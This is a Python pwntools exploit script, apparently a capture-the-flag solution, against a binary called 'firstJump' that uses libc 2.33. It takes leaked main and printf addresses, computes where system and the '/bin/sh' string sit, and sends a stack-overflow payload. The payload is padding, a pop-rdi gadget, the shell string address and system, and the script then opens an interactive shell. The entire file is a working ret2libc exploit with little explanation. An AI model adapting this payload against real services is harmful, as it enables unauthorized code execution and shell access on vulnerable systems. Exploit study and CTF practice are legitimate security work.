from pwn import *

#System ->  0x7f6e0e749f78
#ROP ->  0x55ccccb6526b
#Shell ->  0x7f6e0e83d11c


# Open binaries to retreive information about offsets

e = ELF("./firstJump")

libc = ELF("libc-2.33.so")

rop = ROP(e)

# Diference between main and the pop rdi; ret instruction

diff_rop = e.symbols["main"] - rop.rdi[0]

# Diference between the printf and system functions within libc (Must be the same as used in the server)

diff_printf_system = libc.symbols["printf"] - libc.symbols["system"]

# Diference between the string of /bin/sh and the system function

diff_system_sh = libc.symbols["system"] - next(libc.search(b"/bin/sh"))

print("Difference between printf and system -> ",hex(diff_printf_system))
print("Difference between")
p = process("./firstJump")
main = eval(p.recvline().decode().split(":")[1][1:-1])
printf = eval(p.recv().decode().split(":")[1][1:-1])

system = printf - diff_printf_system

rop_address = main - diff_rop

shell = system - diff_system_sh

print("System -> ",hex(system))
print("ROP -> ",hex(rop_address))
print("Shell -> ",hex(shell))


payload =  b"a"*64 +b"b"*8 + p64(rop_address) + p64(shell) + p64(system)

p.send(payload)

# Use interactive mode for free use of shell

p.interactive()
p.close()

print(main)
print(printf)
